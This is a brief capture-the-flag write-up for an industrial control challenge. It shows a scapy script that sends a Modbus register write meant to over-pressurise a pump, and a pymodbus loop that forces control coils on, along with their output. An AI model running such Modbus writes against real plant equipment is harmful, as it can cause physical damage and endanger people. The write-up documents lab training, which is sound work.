# OT

```Description
_Flags have been omitted from this writeup per platform guidelines._

This challenge drops you into the shoes of the APT operator: With a single crafted Modbus, you over-pressurise the main pump, triggering a thunderous blow-out that floods the plant with alarms. While chaos reigns, your partner ghosts through the shaken DMZ and installs a stealth implant, turning the diversion’s echo into your persistent beachhead.  
**Note:** The VM takes about **3 minutes** to boot up.
```

Firstly Got script from ``ChatGpt``  
```
from scapy.all import *
class ModbusRequest(Packet):
    name = "ModbusRequest"
    fields_desc = [
        ShortField("trans_id", 0x0001),
        ShortField("proto_id", 0x0000),
        ShortField("length", 0x0006),
        ByteField("unit_id", 0x01),
        ByteField("func_code", 0x06),        # Function Code: Write Single Register
        ShortField("reg_addr", 0x0001),      # Register Address
        ShortField("reg_value", 0x270F)      # Value: 9999 (decimal)
    ]

# Send the Modbus packet over TCP
ip = IP(dst="10.10.162.136")
tcp = TCP(dport=502, sport=RandShort(), flags="S")
synack = sr1(ip/tcp, timeout=1)

if synack and synack.haslayer(TCP) and synack[TCP].flags == "SA":
    ack = TCP(dport=502, sport=synack[TCP].dport, seq=1, ack=synack[TCP].seq+1, flags="A")
    send(ip/ack)

    modbus_pkt = TCP(dport=502, sport=synack[TCP].dport, seq=1, ack=synack[TCP].seq+1, flags="PA")/ModbusRequest()
    send(ip/modbus_pkt)

    print("[+] Modbus write sent to trigger overpressure.")
else:
    print("[-] No response from target on port 502.")

```

```bash
python3 python.py 
Begin emission
............
Finished sending 1 packets
*
Received 13 packets, got 1 answers, remaining 0 packets
.
Sent 1 packets.
.
Sent 1 packets.
[+] Modbus write sent to trigger overpressure.
root@ip-10-10-96-139:~# 
```

`H00dy's Script`

```kaboom
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient('10.101.96.216')
client.connect()

# Try flipping common control coils (e.g., 0–40)
for i in range(0, 40):
    client.write_coil(i, True)
```
Got Flag on Port 80 static Website 
```Flag 
[flag omitted]
```
also H00dy Also don't know how he get the Second flag 
```flag
[flag omitted]
```

